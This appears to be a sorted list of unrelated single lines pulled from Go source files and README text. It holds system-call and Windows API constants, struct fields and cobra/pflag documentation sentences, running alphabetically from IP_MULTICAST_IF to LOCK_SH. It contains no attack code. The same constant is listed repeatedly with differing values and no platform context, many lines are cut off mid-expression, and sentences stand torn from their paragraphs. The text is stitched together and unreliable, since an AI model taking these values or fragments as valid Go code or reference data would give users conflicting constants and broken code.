IP_MULTICAST_IF                         = 0x9
IP_MULTICAST_IF                   = 0x9
IP_MULTICAST_IF                 = 7
IP_MULTICAST_IF                = 0x9
IP_MULTICAST_IF               = 0x10
IP_MULTICAST_IF               = 0x9
IP_MULTICAST_IF    = 0x9
IP_MULTICAST_IFINDEX                    = 0x42
IP_MULTICAST_LOOP                           = 0x22
IP_MULTICAST_LOOP                       = 0xb
IP_MULTICAST_LOOP                 = 0xb
IP_MULTICAST_LOOP               = 4
IP_MULTICAST_LOOP              = 0xb
IP_MULTICAST_LOOP             = 0x12
IP_MULTICAST_LOOP             = 0xb
IP_MULTICAST_LOOP  = 0xb
IP_MULTICAST_TTL                            = 0x21
IP_MULTICAST_TTL                        = 0xa
IP_MULTICAST_TTL                  = 0xa
IP_MULTICAST_TTL                = 3
IP_MULTICAST_TTL               = 0xa
IP_MULTICAST_TTL              = 0x11
IP_MULTICAST_TTL              = 0xa
IP_MULTICAST_TTL   = 0xa
IP_MULTICAST_VIF                        = 0xe
IP_MULTICAST_VIF                  = 0xe
IP_MULTICAST_VIF               = 0xe
IP_NAT__XXX                             = 0x37
IP_NEXTHOP                    = 0x19
IP_NODEFRAG                                 = 0x16
IP_OFFMASK                                  = 0x1fff
IP_OFFMASK                              = 0x1fff
IP_OFFMASK                        = 0x1fff
IP_OFFMASK                     = 0x1fff
IP_OLD_FW_ADD                           = 0x32
IP_OLD_FW_DEL                           = 0x33
IP_OLD_FW_FLUSH                         = 0x34
IP_OLD_FW_GET                           = 0x36
IP_OLD_FW_RESETLOG                      = 0x38
IP_OLD_FW_ZERO                          = 0x35
IP_ONESBCAST                   = 0x17
IP_OPT                        = 0x1b
IP_OPTIONS                                  = 0x4
IP_OPTIONS                              = 0x1
IP_OPTIONS                        = 0x1
IP_OPTIONS                      = 1
IP_OPTIONS                     = 0x1
IP_OPTIONS                    = 0x1
IP_ORIGDSTADDR                              = 0x14
IP_ORIGDSTADDR                 = 0x1b
IP_PASSSEC                                  = 0x12
IP_PIPEX                          = 0x22
IP_PKTINFO                                  = 0x8
IP_PKTINFO                              = 0x1a
IP_PKTINFO                      = 101
IP_PKTINFO                    = 0x1a
IP_PKTINFO         = 0x13
IP_PKTOPTIONS                               = 0x9
IP_PMTUAGE                    = 0x1b
IP_PMTUDISC                                 = 0xa
IP_PMTUDISC_DO                              = 0x2
IP_PMTUDISC_DONT                            = 0x0
IP_PMTUDISC_INTERFACE                       = 0x4
IP_PMTUDISC_OMIT                            = 0x5
IP_PMTUDISC_PROBE                           = 0x3
IP_PMTUDISC_WANT                            = 0x1
IP_PORTRANGE                            = 0x13
IP_PORTRANGE                      = 0x13
IP_PORTRANGE                   = 0x13
IP_PORTRANGE_DEFAULT                    = 0x0
IP_PORTRANGE_DEFAULT              = 0x0
IP_PORTRANGE_DEFAULT           = 0x0
IP_PORTRANGE_HIGH                       = 0x1
IP_PORTRANGE_HIGH                 = 0x1
IP_PORTRANGE_HIGH              = 0x1
IP_PORTRANGE_LOW                        = 0x2
IP_PORTRANGE_LOW                  = 0x2
IP_PORTRANGE_LOW               = 0x2
IP_RECVDSTADDR                          = 0x7
IP_RECVDSTADDR                    = 0x7
IP_RECVDSTADDR                 = 0x7
IP_RECVDSTADDR                = 0x7
IP_RECVDSTPORT                    = 0x21
IP_RECVERR                                  = 0xb
IP_RECVERR_RFC4884                          = 0x1a
IP_RECVFLOWID                  = 0x5d
IP_RECVFRAGSIZE                             = 0x19
IP_RECVIF                               = 0x14
IP_RECVIF                         = 0x14
IP_RECVIF                         = 0x1e
IP_RECVIF                      = 0x14
IP_RECVIF                     = 0x14
IP_RECVIF                     = 0x9
IP_RECVIFINFO                 = 0xf
IP_RECVINTERFACE              = 0x20
IP_RECVMACHDR                 = 0xe
IP_RECVOPTS                                 = 0x6
IP_RECVOPTS                             = 0x5
IP_RECVOPTS                       = 0x5
IP_RECVOPTS                    = 0x5
IP_RECVOPTS                   = 0x5
IP_RECVORIGDSTADDR                          = 0x14
IP_RECVORIGDSTADDR             = 0x1b
IP_RECVPKTINFO                          = 0x1a
IP_RECVPKTINFO                  = 102
IP_RECVPKTINFO                = 0x1a
IP_RECVRETOPTS                              = 0x7
IP_RECVRETOPTS                          = 0x6
IP_RECVRETOPTS                    = 0x6
IP_RECVRETOPTS                 = 0x6
IP_RECVRETOPTS                = 0x6
IP_RECVRSSBUCKETID             = 0x5e
IP_RECVRTABLE                     = 0x23
IP_RECVSLLA                   = 0xa
IP_RECVTOS                                  = 0xd
IP_RECVTOS                              = 0x1b
IP_RECVTOS                     = 0x44
IP_RECVTOS                    = 0xc
IP_RECVTTL                                  = 0xc
IP_RECVTTL                              = 0x18
IP_RECVTTL                        = 0x17
IP_RECVTTL                        = 0x1f
IP_RECVTTL                        = 0x41
IP_RECVTTL                     = 0x41
IP_RECVTTL                    = 0x22
IP_RECVTTL                    = 0xb
IP_RETOPTS                                  = 0x7
IP_RETOPTS                              = 0x8
IP_RETOPTS                        = 0x8
IP_RETOPTS                     = 0x8
IP_RETOPTS                    = 0x8
IP_REUSEADDR                  = 0x104
IP_RF                                       = 0x8000
IP_RF                                   = 0x8000
IP_RF                             = 0x8000
IP_RF                          = 0x8000
IP_ROUTER_ALERT                             = 0x5
IP_RSSBUCKETID                 = 0x5c
IP_RSS_LISTEN_BUCKET           = 0x1a
IP_RSVP_OFF                             = 0x10
IP_RSVP_OFF                       = 0x10
IP_RSVP_OFF                    = 0x10
IP_RSVP_ON                              = 0xf
IP_RSVP_ON                        = 0xf
IP_RSVP_ON                     = 0xf
IP_RSVP_VIF_OFF                         = 0x12
IP_RSVP_VIF_OFF                   = 0x12
IP_RSVP_VIF_OFF                = 0x12
IP_RSVP_VIF_ON                          = 0x11
IP_RSVP_VIF_ON                    = 0x11
IP_RSVP_VIF_ON                 = 0x11
IP_RTABLE                         = 0x1021
IP_SEC_OPT                    = 0x22
IP_SENDSRCADDR                    = 0x7
IP_SENDSRCADDR                 = 0x7
IP_SOURCE_FILTER              = 0x48
IP_STRIPHDR                             = 0x17
IP_TOS                                      = 0x1
IP_TOS                                  = 0x3
IP_TOS                            = 0x3
IP_TOS                          = 2
IP_TOS                         = 0x3
IP_TOS                        = 0x3
IP_TOS             = 0x3
IP_TRAFFIC_MGT_BACKGROUND               = 0x41
IP_TRANSPARENT                              = 0x13
IP_TTL                                      = 0x2
IP_TTL                                  = 0x4
IP_TTL                            = 0x4
IP_TTL                          = 3
IP_TTL                         = 0x4
IP_TTL                        = 0x4
IP_TTL             = 0x4
IP_UNBLOCK_SOURCE                           = 0x25
IP_UNBLOCK_SOURCE                       = 0x49
IP_UNBLOCK_SOURCE               = 11
IP_UNBLOCK_SOURCE              = 0x49
IP_UNBLOCK_SOURCE             = 0x16
IP_UNBLOCK_SOURCE             = 0x3b
IP_UNICAST_HOPS               = 0x4
IP_UNICAST_IF                               = 0x32
IP_UNSPEC_SRC                 = 0x42
IP_USER_FLOW                                = 0xd
IP_XFRM_POLICY                              = 0x11
IPv6Mreq) (err error) {
ISIG                                    = 0x80
ISIG                              = 0x80
ISIG                             = 0x1
ISIG                             = 0x80
ISIG                            = 0x0040
ISIG                           = 0x80
ISIG                          = 0x1
ISOFS_SUPER_MAGIC                           = 0x9660
ISOLATIONAWARE_MANIFEST_RESOURCE_ID                ResourceID = 2
ISOLATIONAWARE_NOSTATICIMPORT_MANIFEST_RESOURCE_ID ResourceID = 3
ISOLATIONPOLICY_BROWSER_MANIFEST_RESOURCE_ID       ResourceID = 5
ISOLATIONPOLICY_MANIFEST_RESOURCE_ID               ResourceID = 4
ISPTM   = (int32('P') << 8) 
ISTRIP                                      = 0x20
ISTRIP                                  = 0x20
ISTRIP                            = 0x20
ISTRIP                          = 0x0080
ISTRIP                         = 0x20
ISTRIP                        = 0x20
ITIMER_/ 
ITIMER_PROF                                 = 0x2
ITIMER_REAL                                 = 0x0
ITIMER_VIRTUAL                              = 0x1
IUCLC                             = 0x1000
IUCLC                            = 0x1000
IUCLC                            = 0x200
IUCLC                         = 0x200
IUCLC                         = 0x800
IUTF8                                       = 0x4000
IUTF8                                   = 0x4000
IX(ON
IXANY                                       = 0x800
IXANY                                   = 0x800
IXANY                             = 0x800
IXANY                          = 0x800
IXANY                         = 0x1000
IXANY                         = 0x800
IXOFF                                   = 0x400
IXOFF                             = 0x400
IXOFF                            = 0x1000
IXOFF                            = 0x400
IXOFF                           = 0x0100
IXOFF                          = 0x400
IXOFF                         = 0x1000
IXOFF                         = 0x400
IXON                                    = 0x200
IXON                              = 0x200
IXON                             = 0x200
IXON                             = 0x400
IXON                            = 0x0200
IXON                           = 0x200
IXON                          = 0x200
IXON                          = 0x400
I_FIND = uintptr((int32('S')<<8 
I_FLUSH                       = 0x20005305
I_LINK    = 0x530c
I_PLINK   = 0x5316
I_POP     = 0x5303
I_PUNLINK = 0x5317
I_PUSH    = 0x5302
I_PUSH = uintptr((int32('S')<<8 
I_STR     = 0x5308
I_STR  = uintptr((int32('S')<<8 
I_UNLINK  = 0x530d
Ibytes       uint64
Ibytes      uint32
Ibytes      uint64
Ibytes     uint32
Ibytes     uint64
Icmp_code uint8
Icmp_type uint8
Id       uint32
Id     uint32
Id   [16]int8
Id   [16]uint8
Id   uint32
Ideally you place this in app/cmd/root.go:
Ident     uint32
Ident     uint64
Ident  uint32
Ident  uint64
Identifier      
Identity [32]uint8
Idrss    int32
Idrss    int64
Ieee_instruction_pointer uint64
Ierrors      uint64
Ierrors     uint32
Ierrors     uint64
Ierrors    uint32
Ierrors    uint64
If shell completion is not already enabled in your environment you will need
If you are using the 
If you do not wish to use the default 
If you have a pflag.FlagSet with a flag called 'flagname' of type int you
If you have different flags that must be provided together (e.g. if they provide the 
If you wanted to create a version command you would create cmd/version.go and
IfIndex               uint32
IfOperStatusDormant        = 5
IfOperStatusDown           = 2
IfOperStatusLowerLayerDown = 7
IfOperStatusNotPresent     = 6
IfOperStatusTesting        = 3
IfOperStatusUnknown        = 4
IfOperStatusUp             = 1
IfType                uint32
Ifindex        uint32
Ifindex      uint32
Ifindex   int32
Ifindex  int
Ifindex  int32
Ifindex  uint32
Ifindex int
Ifindex int32
Ifindex uint32
Iflag  uint32
Iflag  uint64
Iflag uint16
Iflag uint32
Ifreq itself later to prevent
Ifreq) Name() string {
Ifreq) SetInet4Addr(v []byte) error {
Ifreq) SetUint16(v uint16) {
Ifreq) SetUint32(v uint32) {
Ifreq) Uint16() uint16 {
Ifreq) Uint32() uint32 {
Ifreq) clear() {
Ifreq) error {
IfreqData directly.
IfreqMTU) error {
Ifrn [16]byte
Ifru [16]byte
Ifru [24]byte
ImageBase        uintptr
ImageBaseAddress       uintptr
ImageName                    NTUnicodeString
ImagePathName    NTUnicodeString
ImageSize        uint32
Imcasts      uint64
Imcasts     uint32
Imcasts     uint64
Imcasts    uint32
Imcasts    uint64
ImpersonateSelf(impersonationlevel uint32) (err error) = advapi32.ImpersonateSelf
ImpersonationLevel  uint32
ImpersonationLevel uint32
Important:
Improvements
In addition add the 
In both of these cases:
In order to support flags defined using Go's 
In this command we are telling Git to clone the url bare.
InDiscards      uint32
InErrors        uint32
InMemoryOrderLinks LIST_ENTRY
InMemoryOrderModuleList LIST_ENTRY
InNUcastPkts    uint32
InOctets        uint32
InUcastPkts     uint32
InUnknownProtos uint32
Inactarg           int32
Inactive           int32
Inblock  int32
Inblock  int64
IncludeLeadingResets  bool
IncludeTrailingResets bool
Incompatible
Incompatible With Secondary Licenses
Index               uint32
Index            uint32
Index           uint32
Index          uint32
Index     uint16
Index     uint32
Index    uint16
Index   uint16
Index  int32
Index  uint16
Inet4Pktinfo) []byte {
Inet4Pktinfo)(h.data(0)) = 
Inet6Pktinfo) []byte {
Inet6Pktinfo)(h.data(0)) = 
InfDate         Filetime
Info       []FileDedupeRangeInfo
Info    PPSKInfo
Info   uint32
InfoChoice                uint32
InfoOrSerializedInfoOrOID unsafe.Pointer
InfoStatus  uint32
Information uintptr
InheritHandle      uint32
Inheritable uint32
Inheritance       uint32
InheritedFromUniqueProcessID uintptr
InheritedFromUniqueProcessId uintptr
InheritedObjectTypeGuid GUID
InheritedObjectTypeName 
Init             [2]uint32
Init             [2]uint64
InitOrderIndex   uint16
Initial release.
InitiateSystemShutdownEx(machineName 
Inits     int32
Inits    uint32
Inits   uint32
Inits   uint64
Ino             uint64
Ino            uint64
Ino          uint32
Ino        uint64
Ino      uint32
Ino      uint64
Ino     uint32
Ino     uint64
Ino    uint32
Ino    uint64
Inode            uint32
Inode            uint64
Inside rootCmd PersistentPostRun with args: []
Inside rootCmd PersistentPreRun with args: []
Inside rootCmd PersistentPreRun with args: [arg1 arg2]
Inside rootCmd PostRun with args: []
Inside rootCmd PreRun with args: []
Inside rootCmd Run with args: []
Inside subCmd PersistentPostRun with args: [arg1 arg2]
Inside subCmd PostRun with args: [arg1 arg2]
Inside subCmd PreRun with args: [arg1 arg2]
Inside subCmd Run with args: [arg1 arg2]
Insns 
Insns     
Install by running:
InstallFunction DI_FUNCTION
InstallMsgHandler        uintptr
InstallMsgHandlerContext uintptr
Installation can be done with a normal 
Instance uint32
Int       int32
Integrity_word uint16
Interface [4]byte /
Interface uint32
Internal     uintptr
InternalHigh uintptr
Interval Timespec
Interval Timeval
Interval uint32
Intrs              int32
Invalid   = Variant(iota) // Invalid UUID
InvalidHWND   = 
InvalidHandle = 
Invarsec    uint32
IoInfo                IO_COUNTERS
Io_wait         uint64
Iopl(level int) (err error)
Iosize      int32
Iosize      int64
Iosize      uint32
Iosize      uint64
Iov        
Iov          
Iovec
Iovec) SetLen(length int) {
Iovlen       int32
Iovlen     int32
Iovlen     uint32
Iovlen     uint64
IpAdapterAddresses
IpAdapterAnycastAddress
IpAdapterDnsServerAdapter
IpAdapterInfo
IpAdapterMulticastAddress
IpAdapterPrefix
IpAdapterUnicastAddress
IpAddrString
IpAddress IpAddressString
IpAddressList       IpAddrString
IpMask    IpMaskString
Ipackets     uint64
Ipackets    uint32
Ipackets    uint64
Ipackets   uint32
Ipackets   uint64
Ipv6IfIndex           uint32
Iqdrops      uint64
Iqdrops     uint32
Iqdrops     uint64
Iqdrops    uint32
Iqdrops    uint64
IsBoolFlag() bool
IsDelayedAutoStartUp uint32
IsLocked     uint32
Isdst int32
Isp    uint32
Ispeed int32
Ispeed uint32
Ispeed uint64
Isrss    int32
Isrss    int64
Issetugid() (tainted bool)
IssuanceUsage     
Issuer                 Pointer
Issuer               CertNameBlob
IssuerChainIndex       
IssuerCount            uint32
IssuerElementIndex     
IssuerUniqueId       CryptBitBlob
It also contains instructions on how to modify these files to add a new
It can be installed by running:
It is possible to run functions before or after the main 
It is possible to set a custom flag name 'normalization function.' It allows flag names to be mutated both when created in the code and when used on the command line to some 'normalized' form. The 'normalized' form is used for comparison. Two examples of using the custom normalization func follow.
It is the work of hundreds of contributors. We appreciate your help!
It will bootstrap your application scaffolding to rapidly
ItimerProf    ItimerWhich = ITIMER_PROF
ItimerReal    ItimerWhich = ITIMER_REAL
ItimerSpec) (err error)
ItimerSpec) (err error) {
ItimerVirtual ItimerWhich = ITIMER_VIRTUAL
Itimerval) (err error)
Itimerval) (err error) {
Ivsize      uint32
Iwcapsegs uint64
Iwmaxsegs uint64
Ixrss    int32
Ixrss    int64
JFFS2_SUPER_MAGIC                           = 0x72b6
JMP syscall
JOB_OBJECT_LIMIT_ACTIVE_PROCESS             = 0x00000008
JOB_OBJECT_LIMIT_AFFINITY                   = 0x00000010
JOB_OBJECT_LIMIT_BREAKAWAY_OK               = 0x00000800
JOB_OBJECT_LIMIT_DIE_ON_UNHANDLED_EXCEPTION = 0x00000400
JOB_OBJECT_LIMIT_JOB_MEMORY                 = 0x00000200
JOB_OBJECT_LIMIT_JOB_TIME                   = 0x00000004
JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE          = 0x00002000
JOB_OBJECT_LIMIT_PRESERVE_JOB_TIME          = 0x00000040
JOB_OBJECT_LIMIT_PRIORITY_CLASS             = 0x00000020
JOB_OBJECT_LIMIT_PROCESS_MEMORY             = 0x00000100
JOB_OBJECT_LIMIT_PROCESS_TIME               = 0x00000002
JOB_OBJECT_LIMIT_SCHEDULING_CLASS           = 0x00000080
JOB_OBJECT_LIMIT_SILENT_BREAKAWAY_OK        = 0x00001000
JOB_OBJECT_LIMIT_SUBSET_AFFINITY            = 0x00004000
JOB_OBJECT_LIMIT_WORKINGSET                 = 0x00000001
JOB_OBJECT_UILIMIT_DESKTOP          = 0x00000040
JOB_OBJECT_UILIMIT_DISPLAYSETTINGS  = 0x00000010
JOB_OBJECT_UILIMIT_EXITWINDOWS      = 0x00000080
JOB_OBJECT_UILIMIT_GLOBALATOMS      = 0x00000020
JOB_OBJECT_UILIMIT_HANDLES          = 0x00000001
JOB_OBJECT_UILIMIT_READCLIPBOARD    = 0x00000002
JOB_OBJECT_UILIMIT_SYSTEMPARAMETERS = 0x00000008
JOB_OBJECT_UILIMIT_WRITECLIPBOARD   = 0x00000004
JSCRIPT_E_CANTEXECUTE                                                     Handle        = 0x89020001
Jf   uint8
Jitcnt    int32
Jitcnt    int64
Jitter    int32
Jitter    int64
JobMemoryLimit        uintptr
JobObjectAssociateCompletionPortInformation = 7
JobObjectBasicLimitInformation              = 2
JobObjectBasicUIRestrictions                = 4
JobObjectCpuRateControlInformation          = 15
JobObjectEndOfJobTimeInformation            = 6
JobObjectExtendedLimitInformation           = 9
JobObjectGroupInformation                   = 11
JobObjectGroupInformationEx                 = 14
JobObjectLimitViolationInformation2         = 35
JobObjectNetRateControlInformation          = 32
JobObjectNotificationLimitInformation       = 12
JobObjectNotificationLimitInformation2      = 34
JobObjectSecurityLimitInformation           = 5
Jobc    int16
Jobname      [8]byte
Jt   uint8
K    uint32
KCM/ 
KCMPROTO_CONNECTED                          = 0x0
KCM_RECV_DISABLE                            = 0x1
KERN
KERN_(HOSTNAME
KERN_HOSTNAME                           = 0xa
KERN_HOSTNAME                     = 0xa
KERN_HOSTNAME                  = 0xa
KERN_OSRELEASE                          = 0x2
KERN_OSRELEASE                    = 0x2
KERN_OSRELEASE                 = 0x2
KERN_OSTYPE                             = 0x1
KERN_OSTYPE                       = 0x1
KERN_OSTYPE                    = 0x1
KERN_VERSION                            = 0x4
KERN_VERSION                      = 0x4
KERN_VERSION                   = 0x4
KEXEC_/ 
KEXEC_ARCH_386                              = 0x30000
KEXEC_ARCH_68K                              = 0x40000
KEXEC_ARCH_AARCH64                          = 0xb70000
KEXEC_ARCH_ARM                              = 0x280000
KEXEC_ARCH_DEFAULT                          = 0x0
KEXEC_ARCH_IA_64                            = 0x320000
KEXEC_ARCH_LOONGARCH                        = 0x1020000
KEXEC_ARCH_MASK                             = 0xffff0000
KEXEC_ARCH_MIPS                             = 0x80000
KEXEC_ARCH_MIPS_LE                          = 0xa0000
KEXEC_ARCH_PARISC                           = 0xf0000
KEXEC_ARCH_PPC                              = 0x140000
KEXEC_ARCH_PPC64                            = 0x150000
KEXEC_ARCH_RISCV                            = 0xf30000
KEXEC_ARCH_S390                             = 0x160000
KEXEC_ARCH_SH                               = 0x2a0000
KEXEC_ARCH_X86_64                           = 0x3e0000
KEXEC_FILE_NO_INITRAMFS                     = 0x4
KEXEC_FILE_ON_CRASH                         = 0x2
KEXEC_FILE_UNLOAD                           = 0x1
KEXEC_ON_CRASH                              = 0x1
KEXEC_PRESERVE_CONTEXT                      = 0x2
KEXEC_SEGMENT_MAX                           = 0x10
KEYCTL_/ 
KEYCTL_ASSUME_AUTHORITY                     = 0x10
KEYCTL_CAPABILITIES                         = 0x1f
KEYCTL_CAPS0_BIG_KEY                        = 0x10
KEYCTL_CAPS0_CAPABILITIES                   = 0x1
KEYCTL_CAPS0_DIFFIE_HELLMAN                 = 0x4
KEYCTL_CAPS0_INVALIDATE                     = 0x20
KEYCTL_CAPS0_MOVE                           = 0x80
KEYCTL_CAPS0_PERSISTENT_KEYRINGS            = 0x2
KEYCTL_CAPS0_PUBLIC_KEY                     = 0x8
KEYCTL_CAPS0_RESTRICT_KEYRING               = 0x40
KEYCTL_CAPS1_NOTIFICATIONS                  = 0x4
KEYCTL_CAPS1_NS_KEYRING_NAME                = 0x1
KEYCTL_CAPS1_NS_KEY_TAG                     = 0x2
KEYCTL_CHOWN                                = 0x4
KEYCTL_CLEAR                                = 0x7
KEYCTL_DESCRIBE                             = 0x6
KEYCTL_DH_COMPUTE                           = 0x17
KEYCTL_GET_KEYRING_ID                       = 0x0
KEYCTL_GET_PERSISTENT                       = 0x16
KEYCTL_GET_SECURITY                         = 0x11
KEYCTL_INSTANTIATE                          = 0xc
KEYCTL_INSTANTIATE_IOV                      = 0x14
KEYCTL_INVALIDATE                           = 0x15
KEYCTL_JOIN_SESSION_KEYRING                 = 0x1
KEYCTL_LINK                                 = 0x8
KEYCTL_MOVE                                 = 0x1e
KEYCTL_MOVE_EXCL                            = 0x1
KEYCTL_NEGATE                               = 0xd
KEYCTL_PKEY_DECRYPT                         = 0x1a
KEYCTL_PKEY_ENCRYPT                         = 0x19
KEYCTL_PKEY_QUERY                           = 0x18
KEYCTL_PKEY_SIGN                            = 0x1b
KEYCTL_PKEY_VERIFY                          = 0x1c
KEYCTL_READ                                 = 0xb
KEYCTL_REJECT                               = 0x13
KEYCTL_RESTRICT_KEYRING                     = 0x1d
KEYCTL_REVOKE                               = 0x3
KEYCTL_SEARCH                               = 0xa
KEYCTL_SESSION_TO_PARENT                    = 0x12
KEYCTL_SETPERM                              = 0x5
KEYCTL_SET_REQKEY_KEYRING                   = 0xe
KEYCTL_SET_TIMEOUT                          = 0xf
KEYCTL_SUPPORTS_DECRYPT                     = 0x2
KEYCTL_SUPPORTS_ENCRYPT                     = 0x1
KEYCTL_SUPPORTS_SIGN                        = 0x4
KEYCTL_SUPPORTS_VERIFY                      = 0x8
KEYCTL_UNLINK                               = 0x9
KEYCTL_UPDATE                               = 0x2
KEYCTL_WATCH_KEY                            = 0x20
KEY_(SPEC
KEY_ALL_ACCESS         = 0xf003f
KEY_CREATE_LINK        = 32
KEY_CREATE_SUB_KEY     = 4
KEY_DESC
KEY_ENUMERATE_SUB_KEYS = 8
KEY_EXECUTE            = 0x20019
KEY_NOTIFY             = 16
KEY_QUERY_VALUE        = 1
KEY_READ               = 0x20019
KEY_REQKEY_DEFL_DEFAULT                     = 0x0
KEY_REQKEY_DEFL_GROUP_KEYRING               = 0x6
KEY_REQKEY_DEFL_NO_CHANGE                   = -0x1
KEY_REQKEY_DEFL_PROCESS_KEYRING             = 0x2
KEY_REQKEY_DEFL_REQUESTOR_KEYRING           = 0x7
KEY_REQKEY_DEFL_SESSION_KEYRING             = 0x3
KEY_REQKEY_DEFL_THREAD_KEYRING              = 0x1
KEY_REQKEY_DEFL_USER_KEYRING                = 0x4
KEY_REQKEY_DEFL_USER_SESSION_KEYRING        = 0x5
KEY_SET_VALUE          = 2
KEY_SPEC_GROUP_KEYRING                      = -0x6
KEY_SPEC_PROCESS_KEYRING                    = -0x2
KEY_SPEC_REQKEY_AUTH_KEY                    = -0x7
KEY_SPEC_REQUESTOR_KEYRING                  = -0x8
KEY_SPEC_SESSION_KEYRING                    = -0x3
KEY_SPEC_THREAD_KEYRING                     = -0x1
KEY_SPEC_USER_KEYRING                       = -0x4
KEY_SPEC_USER_SESSION_KEYRING               = -0x5
KEY_WOW64_32KEY        = 0x0200
KEY_WOW64_64KEY        = 0x0100
KEY_WRITE              = 0x20006
KF_FLAG_ALIAS_ONLY                       = 0x80000000
KF_FLAG_CREATE                           = 0x00008000
KF_FLAG_DEFAULT                          = 0x00000000
KF_FLAG_DEFAULT_PATH                     = 0x00000400
KF_FLAG_DONT_UNEXPAND                    = 0x00002000
KF_FLAG_DONT_VERIFY                      = 0x00004000
KF_FLAG_FORCE_APPCONTAINER_REDIRECTION   = 0x00020000
KF_FLAG_FORCE_APP_DATA_REDIRECTION       = 0x00080000
KF_FLAG_FORCE_PACKAGE_REDIRECTION        = 0x00020000
KF_FLAG_INIT                             = 0x00000800
KF_FLAG_NOT_PARENT_RELATIVE              = 0x00000200
KF_FLAG_NO_ALIAS                         = 0x00001000
KF_FLAG_NO_APPCONTAINER_REDIRECTION      = 0x00010000
KF_FLAG_NO_PACKAGE_REDIRECTION           = 0x00010000
KF_FLAG_RETURN_FILTER_REDIRECTION_TARGET = 0x00040000
KF_FLAG_SIMPLE_IDLIST                    = 0x00000100
KbFlg6n0NhuTsN4MyznaarGsZM=
KernelTime                   int64
KernelTime   Filetime
KernelVersion string
Kernel_gen uint32
Kernel_len uint32
Key       [80]uint8
Key  int32
KeySpec                uint32
Key_id   uint32
Key_spec             FscryptKeySpecifier
Key_spec     FscryptKeySpecifier
Key_spec FscryptKeySpecifier
Keylen    uint16
Kmapent            int32
KnownSubject 
LABEL_SECURITY_INFORMATION            = 0x00000010
LANDLOCK_/ 
LANDLOCK_ACCESS_FS_EXECUTE                  = 0x1
LANDLOCK_ACCESS_FS_MAKE_BLOCK               = 0x800
LANDLOCK_ACCESS_FS_MAKE_CHAR                = 0x40
LANDLOCK_ACCESS_FS_MAKE_DIR                 = 0x80
LANDLOCK_ACCESS_FS_MAKE_FIFO                = 0x400
LANDLOCK_ACCESS_FS_MAKE_REG                 = 0x100
LANDLOCK_ACCESS_FS_MAKE_SOCK                = 0x200
LANDLOCK_ACCESS_FS_MAKE_SYM                 = 0x1000
LANDLOCK_ACCESS_FS_READ_DIR                 = 0x8
LANDLOCK_ACCESS_FS_READ_FILE                = 0x4
LANDLOCK_ACCESS_FS_REFER                    = 0x2000
LANDLOCK_ACCESS_FS_REMOVE_DIR               = 0x10
LANDLOCK_ACCESS_FS_REMOVE_FILE              = 0x20
LANDLOCK_ACCESS_FS_WRITE_FILE               = 0x2
LANDLOCK_CREATE_RULESET_VERSION             = 0x1
LANDLOCK_RULE_PATH_BENEATH = 0x1
LANG_ENGLISH       = 0x09
LAYERED_PROTOCOL   = 0
LCNT_OVERLOAD_FLUSH               = 0x6
LE_CALL
LHND                = LMEM_MOVEABLE 
LINE_LEN                    = 256  // Windows 9x-compatible maximum for displayable strings coming from a device INF.
LINUX_CAPABILITY_VERSION_1 = 0x19980330
LINUX_CAPABILITY_VERSION_2 = 0x20071026
LINUX_CAPABILITY_VERSION_3 = 0x20080522
LINUX_REBOOT_CMD_/ 
LINUX_REBOOT_CMD_CAD_OFF                    = 0x0
LINUX_REBOOT_CMD_CAD_ON                     = 0x89abcdef
LINUX_REBOOT_CMD_HALT                       = 0xcdef0123
LINUX_REBOOT_CMD_KEXEC                      = 0x45584543
LINUX_REBOOT_CMD_POWER_OFF                  = 0x4321fedc
LINUX_REBOOT_CMD_RESTART                    = 0x1234567
LINUX_REBOOT_CMD_RESTART2                   = 0xa1b2c3d4
LINUX_REBOOT_CMD_SW_SUSPEND                 = 0xd000fce2
LINUX_REBOOT_MAGIC1                         = 0xfee1dead
LINUX_REBOOT_MAGIC2                         = 0x28121969
LINUX_REBOOT_MAGIC[12]$/ 
LIST_ENTRY
LIST_MODULES_32BIT   = 0x01
LIST_MODULES_64BIT   = 0x02
LIST_MODULES_ALL     = 0x03
LIST_MODULES_DEFAULT = 0x00
LLCP
LMEM_DISCARDABLE    = 0xf00
LMEM_FIXED          = 0x0
LMEM_INVALID_HANDLE = 0x8000
LMEM_MODIFY         = 0x80
LMEM_MOVEABLE       = 0x2
LMEM_NOCOMPACT      = 0x10
LMEM_NODISCARD      = 0x20
LMEM_VALID_FLAGS    = 0xf72
LMEM_ZEROINIT       = 0x40
LNOFLSH                       = 0x8000
LOAD_IGNORE_CODE_AUTHZ_LEVEL              = 0x10
LOAD_LIBRARY_AS_DATAFILE                  = 0x2
LOAD_LIBRARY_AS_DATAFILE_EXCLUSIVE        = 0x40
LOAD_LIBRARY_AS_IMAGE_RESOURCE            = 0x20
LOAD_LIBRARY_OS_INTEGRITY_CONTINUITY      = 0x00008000
LOAD_LIBRARY_REQUIRE_SIGNED_TARGET        = 0x80
LOAD_LIBRARY_SAFE_CURRENT_DIRS            = 0x00002000
LOAD_LIBRARY_SEARCH_APPLICATION_DIR       = 0x200
LOAD_LIBRARY_SEARCH_DEFAULT_DIRS          = 0x1000
LOAD_LIBRARY_SEARCH_DLL_LOAD_DIR          = 0x100
LOAD_LIBRARY_SEARCH_SYSTEM32              = 0x800
LOAD_LIBRARY_SEARCH_SYSTEM32_NO_FORWARDER = 0x00004000
LOAD_LIBRARY_SEARCH_USER_DIRS             = 0x400
LOAD_WITH_ALTERED_SEARCH_PATH             = 0x8
LOCAL
LOCAL_CONNWAIT                 = 0x4
LOCAL_CREDS                    = 0x2
LOCAL_CREDS_PERSISTENT         = 0x3
LOCAL_PEERCRED                          = 0x1
LOCAL_PEERCRED                 = 0x1
LOCAL_PEEREPID                          = 0x3
LOCAL_PEEREUUID                         = 0x5
LOCAL_PEERPID                           = 0x2
LOCAL_PEERTOKEN                         = 0x6
LOCAL_PEERUUID                          = 0x4
LOCAL_VENDOR                   = 0x80000000
LOCKFILE_EXCLUSIVE_LOCK   = 0x00000002
LOCKFILE_FAIL_IMMEDIATELY = 0x00000001
LOCKS
LOCK_(SH
LOCK_EX                                     = 0x2
LOCK_EX                                 = 0x2
LOCK_EX                           = 0x2
LOCK_EX                         = 0x2 // Not exist on zOS
LOCK_EX                        = 0x2
LOCK_EX                       = 0x2
LOCK_NB                                     = 0x4
LOCK_NB                                 = 0x4
LOCK_NB                           = 0x4
LOCK_NB                         = 0x4 // Not exist on zOS
LOCK_NB                        = 0x4
LOCK_NB                       = 0x4
LOCK_SH                                     = 0x1
LOCK_SH                                 = 0x1
LOCK_SH                           = 0x1
LOCK_SH                         = 0x1 // Not exist on zOS
LOCK_SH                        = 0x1
LOCK_SH                       = 0x1
